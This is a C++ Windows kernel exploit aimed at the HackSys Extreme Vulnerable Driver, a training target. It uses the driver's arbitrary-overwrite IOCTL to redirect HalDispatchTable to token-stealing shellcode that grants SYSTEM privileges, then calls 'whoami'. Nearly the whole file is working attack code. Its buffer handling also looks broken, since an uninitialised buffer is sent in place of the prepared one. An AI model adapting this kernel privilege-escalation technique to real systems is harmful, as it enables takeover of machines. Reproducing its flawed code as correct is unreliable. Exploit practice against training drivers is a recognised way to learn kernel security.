#include <Windows.h>
#include <stdio.h>
#include <iostream>
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct SYSTEM_MODULE {
    ULONG                Reserved1;
    ULONG                Reserved2;
#ifdef _WIN64
    ULONG				Reserved3;
#endif
    PVOID                ImageBaseAddress;
    ULONG                ImageSize;
    ULONG                Flags;
    WORD                 Id;
    WORD                 Rank;
    WORD                 w018;
    WORD                 NameOffset;
    CHAR                 Name[255];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG                ModulesCount;
    SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* PNtQueryIntervalProfile)(
    DWORD ProfileSource,
    PULONG Interval
    );

int ArbitraryWrite()
{
    unsigned char shellcode[] = {
        0x60,
        0x64, 0xA1, 0x24, 0x01, 0x00, 0x00,
        0x8B, 0x40, 0x50,
        0x89, 0xC1,
        0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00,
        //---[Копируем токен System PID]
        0xBA, 0x04, 0x00, 0x00, 0x00,
        0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
        0x2D, 0xB8, 0x00, 0x00, 0x00,
        0x39, 0x90, 0xB4, 0x00, 0x00, 0x00,
        0x75, 0xED,
        0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00,
        0x89, 0x91, 0xF8, 0x00, 0x00, 0x00,
        //---[Восстанавливаем]
        0x61,                               // popad
        0xC3                                //ret
    };

    HANDLE device = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    printf("[+] Open device handle 0x%x\n", device);

    ULONG retinfo;
    HMODULE ntdll = GetModuleHandle(L"ntdll");
    PNtQuerySystemInformation _NtQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    _NtQuerySystemInformation(SystemModuleInformation, 0, 0, &retinfo);

    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, retinfo);
    _NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, retinfo, &retinfo);


    ULONG kernelImageBase = (ULONG)pModuleInfo->Modules[0].ImageBaseAddress;
    PCHAR kernelImage = (PCHAR)pModuleInfo->Modules[0].Name;

    char* krnl_name = strrchr((char*)kernelImage, '\\') + 1;
    printf("[+] Kernel found \"%s\"\n", krnl_name);
    printf("[+] Kernel address 0x%x\n", kernelImageBase);
    HMODULE user_ntoskrnl = LoadLibraryExA(krnl_name, NULL, DONT_RESOLVE_DLL_REFERENCES);
    printf("[+] Kernel user-space address 0x%x\n", user_ntoskrnl);
    ULONG user_HalDispatchTable = (ULONG)GetProcAddress(user_ntoskrnl, "HalDispatchTable");
    printf("[+] User-space HalDispatchTable address 0x%x\n", user_HalDispatchTable);
    ULONG addr_HalDispatchTable = kernelImageBase - (ULONG)user_ntoskrnl + user_HalDispatchTable;
    printf("[+] Kernel-space HalDispatcheTable address 0x%x\n", addr_HalDispatchTable);

    ULONG What = (ULONG)&shellcode;
    PULONG uBuffer = (PULONG)VirtualAlloc(
        NULL,
        8,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    char lpInBuffer[8];
    // memcpy(lpInBuffer, &What, 4);
    // memcpy(&lpInBuffer[4], addr_HalDispatchTable + 4, 4);

    *uBuffer = (ULONG)&What;
    *(uBuffer + 1) = (addr_HalDispatchTable + 4);
    DWORD retn;
    DeviceIoControl(device, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, lpInBuffer, 4, NULL, NULL, &retn, NULL);
    PNtQueryIntervalProfile NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
    ULONG bytes;
    NtQueryIntervalProfile(2, &bytes);
    system("whoami");
}